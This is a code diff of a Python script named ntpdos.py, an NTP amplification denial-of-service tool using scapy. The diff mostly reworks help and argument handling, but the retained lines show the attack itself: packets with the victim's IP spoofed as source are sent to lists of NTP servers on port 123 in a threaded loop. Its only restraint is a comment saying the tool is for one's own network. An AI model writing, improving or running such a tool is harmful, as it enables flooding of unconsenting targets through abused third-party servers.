@@ -1,11 +1,14 @@
 #/usr/bin/python
-#NTP Amp DOS attack
-#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
-#FOR USE ON YOUR OWN NETWORK ONLY
 from scapy.all import *
 import sys
 import threading
 import time
+#NTP Amp DOS attack
+#by DaRkReD
+#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
+#FOR USE ON YOUR OWN NETWORK ONLY
+
+
 #packet sender
 def deny():
 	#Import globals to function
@@ -18,11 +21,8 @@ def deny():
 	packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
 	send(packet,loop=1) #SEND IT
 
-#Fetch Args
-target = sys.argv[1]
-
-#Help out idiots
-if target == "help":
+#So I dont have to have the same stuff twice
+def printhelp():
 	print "NTP Amplification DOS Attack"
 	print "By DaRkReD"
 	print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
@@ -30,6 +30,16 @@ if target == "help":
 	print "NTP serverlist file should contain one IP per line"
 	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
 	exit(0)
+
+if len(sys.argv) < 4:
+	printhelp()
+#Fetch Args
+target = sys.argv[1]
+
+#Help out idiots
+if target in ("help","-h","h","?","--h","--help","/?"):
+	printhelp()
+
 ntpserverfile = sys.argv[2]
 numberthreads = int(sys.argv[3])
 #System for accepting bulk input
